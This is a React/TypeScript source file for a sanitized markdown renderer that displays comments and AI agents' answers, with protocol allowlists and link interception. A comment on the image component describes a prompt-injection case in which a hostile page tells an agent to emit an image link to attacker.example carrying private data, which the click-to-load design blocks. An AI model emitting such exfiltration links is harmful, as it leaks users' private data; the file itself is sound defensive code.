import { Image as ImageIcon } from 'lucide-react';
import { type ReactNode, useState } from 'react';
import ReactMarkdown, { defaultUrlTransform } from 'react-markdown';
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';
import remarkGfm from 'remark-gfm';
import { rpc } from '@renderer/lib/ipc';
import { cn } from '@renderer/lib/utils';
import { remarkBarePaths } from './bare-paths';
import { MARKDOWN_BODY_CLASS, TABLE_CLASS, TABLE_WRAPPER_CLASS } from './markdown-classes';
import { markMentions } from './mark-mentions';

/**
 * Minimal safe markdown (bold/italic/code/lists/links) — a deliberately
 * small stand-in for emdash's full `MarkdownRenderer` (which also does
 * katex, mermaid, syntax highlighting): neither comment bodies nor a pulse
 * Ask answer need any of that, and this app doesn't otherwise carry the
 * dependency footprint for it. No `rehype-raw`, so embedded HTML is never
 * interpreted — react-markdown prints it as literal text by default;
 * `rehype-sanitize` is layered on top anyway as defense in depth. Links
 * never navigate the renderer: they're intercepted and handed to
 * `rpc.app.openExternal`.
 *
 * Two exports, one stack: `SafeMarkdown` is the bare renderer, reused as-is
 * by the pulse Ask answer; `CommentMarkdown` layers `markMentions`'
 * @-mention bolding on top for comment bodies specifically — the ONLY
 * difference between the two, so a second markdown dependency never gets
 * added just because a caller doesn't want mention-bolding.
 *
 * File-mention round (Home pulse's WHAT'S NEW/ACROSS YOUR RIGS narration,
 * `features/home/pulse-file-mentions.ts`): a link whose href is
 * `rigfile:<bindingId>/<relPath>` (that module's own output) is a mention
 * of a file INSIDE a rig, not an external URL — `rpc.app.openExternal` must
 * never see one of these. `onOpenRigFile` is the optional escape hatch for
 * that one href scheme; every other href keeps the plain external-link
 * behavior below, unchanged.
 */

/** Parses a `rigfile:<bindingId>/<relPath>` href — `null` for anything else, including a malformed one. */
function parseRigFileHref(href: string): { bindingId: string; relPath: string } | null {
  const prefix = 'rigfile:';
  if (!href.startsWith(prefix)) return null;
  const rest = href.slice(prefix.length);
  const slash = rest.indexOf('/');
  if (slash === -1) return null;
  const bindingId = rest.slice(0, slash);
  try {
    return { bindingId, relPath: decodeURIComponent(rest.slice(slash + 1)) };
  } catch {
    return null;
  }
}

/** The rig-name link's own accent + dotted-underline convention (`home/briefing-spine.tsx`'s `RigNameLink`) — a rig-file link reads as the same family, not a plain external link's solid underline. */
const RIG_FILE_LINK_CLASS = 'decoration-dotted underline-offset-2';

/**
 * `rehype-sanitize`'s own default schema only allows `http`/`https`/`irc`/
 * `ircs`/`mailto`/`xmpp` as an `href` protocol — anything else (including
 * `rigfile:`) is silently stripped before `SafeMarkdown`'s `a` component
 * ever sees it. Extending the SAME default schema (not replacing it) with
 * `rigfile` is the minimal fix: every other sanitization rule stays
 * exactly as strict as it already was.
 */
const SANITIZE_SCHEMA = {
  ...defaultSchema,
  protocols: {
    ...defaultSchema.protocols,
    href: [...(defaultSchema.protocols?.href ?? []), 'rigfile'],
  },
};

/**
 * `react-markdown` ALSO runs its own URL allowlist on top of
 * `rehype-sanitize` (`defaultUrlTransform`, checked again at render time —
 * `SANITIZE_SCHEMA` above alone isn't enough), with the same
 * http/https/irc/ircs/mailto/xmpp list and no way to extend it. A
 * `rigfile:` href passes through unchanged; everything else still gets
 * `defaultUrlTransform`'s own scrutiny.
 */
function urlTransform(value: string): string {
  return value.startsWith('rigfile:') ? value : defaultUrlTransform(value);
}

/**
 * With an `onOpenPath` handler, links to files are the caller's to resolve
 * (a Room answer's `plan.md`, `/Users/…/plan.md`, `file:///…/plan.md` —
 * see `features/spaces/space-link.ts`): `file:` survives both allowlists,
 * and everything that isn't a web or mail link goes to the handler instead
 * of `openExternal` (which only opens http/https and dropped these).
 */
const FILE_LINK_SANITIZE_SCHEMA = {
  ...SANITIZE_SCHEMA,
  protocols: {
    ...SANITIZE_SCHEMA.protocols,
    // `rig-file://`: an agent's link to a space file shown as a page.
    href: [...(SANITIZE_SCHEMA.protocols?.href ?? []), 'file', 'rig-file'],
  },
};

function fileLinkUrlTransform(value: string): string {
  return /^(file|rig-file):/i.test(value) ? value : urlTransform(value);
}

/** A file link, as handed to `renderFileLink`: the href as written, the link's own text, and whether that text was `code`. */
export type FileLinkParts = { href: string; text: string; code: boolean; children: ReactNode };

type HastNode = { type: string; value?: string; tagName?: string; children?: HastNode[] };

function hastText(node: HastNode | undefined): string {
  if (!node) return '';
  if (node.type === 'text') return node.value ?? '';
  return (node.children ?? []).map(hastText).join('');
}

/** A link the browser side can open: http(s) or mail. Everything else in an agent's answer is a file path. */
function isWebLink(href: string): boolean {
  return /^(https?|mailto):/i.test(href);
}

/**
 * An image in an agent's answer, loaded only when you click it. Loading it on
 * sight would let whoever controls the link learn what's in its URL: an agent
 * that read a hostile page or file can be told to write
 * `![](https://attacker.example/?d=<something private>)`, and every member
 * whose app shows the answer would send it just by looking. An inline
 * `data:` image goes nowhere, so it shows at once.
 */
function ClickToLoadImage({ src, alt }: { src?: string; alt?: string }) {
  const [loaded, setLoaded] = useState(false);
  if (!src) return null;
  if (src.startsWith('data:image/') || loaded) {
    return <img src={src} alt={alt ?? ''} referrerPolicy="no-referrer" className="my-1 max-w-full rounded-control" />;
  }
  let host = '';
  try {
    host = new URL(src).hostname;
  } catch {
    // Not a web address: nothing to load.
    return alt ? <span>{alt}</span> : null;
  }
  return (
    <button
      type="button"
      onClick={() => setLoaded(true)}
      title={src}
      className="border-border-hairline bg-bg-1 hover:bg-bg-2 inline-flex max-w-full items-center gap-1.5 rounded-control border px-2 py-1 align-middle text-xs text-text-secondary"
      data-testid="markdown-image-placeholder"
    >
      <ImageIcon className="size-3.5 shrink-0" strokeWidth={1.5} />
      <span className="min-w-0 truncate">{alt || 'Image'}</span>
      <span className="text-text-muted shrink-0">· {host} · Load</span>
    </button>
  );
}

/**
 * The reusable safe-markdown stack itself — react-markdown + remark-gfm +
 * rehype-sanitize (no rehype-raw), links intercepted and handed to
 * `rpc.app.openExternal` rather than navigating the renderer. Pulled out of
 * `CommentMarkdown` (below) so the pulse Ask answer
 * (`home/briefing-spine.tsx`) can reuse the SAME stack without also
 * picking up `markMentions`' comment-specific @-mention bolding, which has
 * no meaning for an LLM-narrated answer.
 */
export function SafeMarkdown({
  content,
  className,
  onOpenRigFile,
  onOpenPath,
  renderFileLink,
  onOpenWebLink,
}: {
  content: string;
  className?: string;
  /** Handles a `rigfile:<bindingId>/<relPath>` link — see this file's own header comment. */
  onOpenRigFile?: (bindingId: string, relPath: string) => void;
  /** Handles a link to a file (relative, absolute or `file://`), as written — see `FILE_LINK_SANITIZE_SCHEMA`. */
  onOpenPath?: (href: string) => void;
  /**
   * Draws a file link itself (with `onOpenPath`): the Room shows a path
   * inside the space by that path, and says when the file isn't on this
   * computer yet. Also turns bare absolute paths in the text into file
   * links (`bare-paths.ts`), so they get the same treatment.
   */
  renderFileLink?: (parts: FileLinkParts) => ReactNode;
  /** Opens a web or mail link (the Room opens pages beside it); without it, links go to the browser. */
  onOpenWebLink?: (href: string, event: { metaKey: boolean; ctrlKey: boolean }) => void;
}) {
  return (
    <div className={cn(MARKDOWN_BODY_CLASS, className)}>
      <ReactMarkdown
        remarkPlugins={onOpenPath && renderFileLink ? [remarkGfm, remarkBarePaths] : [remarkGfm]}
        rehypePlugins={[[rehypeSanitize, onOpenPath ? FILE_LINK_SANITIZE_SCHEMA : SANITIZE_SCHEMA]]}
        urlTransform={onOpenPath ? fileLinkUrlTransform : urlTransform}
        components={{
          img: ({ src, alt }) => <ClickToLoadImage src={typeof src === 'string' ? src : undefined} alt={alt} />,
          table: ({ children }) => (
            <div className={TABLE_WRAPPER_CLASS}>
              <table className={TABLE_CLASS}>{children}</table>
            </div>
          ),
          a: ({ href, children, node }) => {
            const rigFile = href ? parseRigFileHref(href) : null;
            if (href && !rigFile && onOpenPath && renderFileLink && !isWebLink(href) && !href.startsWith('#')) {
              const kids = (node as HastNode | undefined)?.children ?? [];
              const code = kids.length === 1 && kids[0]!.type === 'element' && kids[0]!.tagName === 'code';
              return renderFileLink({ href, text: hastText(node as HastNode | undefined), code, children });
            }
            return (
              <a
                href={href}
                className={rigFile ? RIG_FILE_LINK_CLASS : undefined}
                onClick={(event) => {
                  event.preventDefault();
                  if (rigFile) {
                    onOpenRigFile?.(rigFile.bindingId, rigFile.relPath);
                    return;
                  }
                  if (href && onOpenPath && !isWebLink(href)) {
                    if (!href.startsWith('#')) onOpenPath(href);
                    return;
                  }
                  if (href && onOpenWebLink && isWebLink(href)) onOpenWebLink(href, event);
                  else if (href) void rpc.app.openExternal(href);
                }}
              >
                {children}
              </a>
            );
          },
        }}
      >
        {content}
      </ReactMarkdown>
    </div>
  );
}

export function CommentMarkdown({ content, className }: { content: string; className?: string }) {
  return <SafeMarkdown content={markMentions(content)} className={className} />;
}
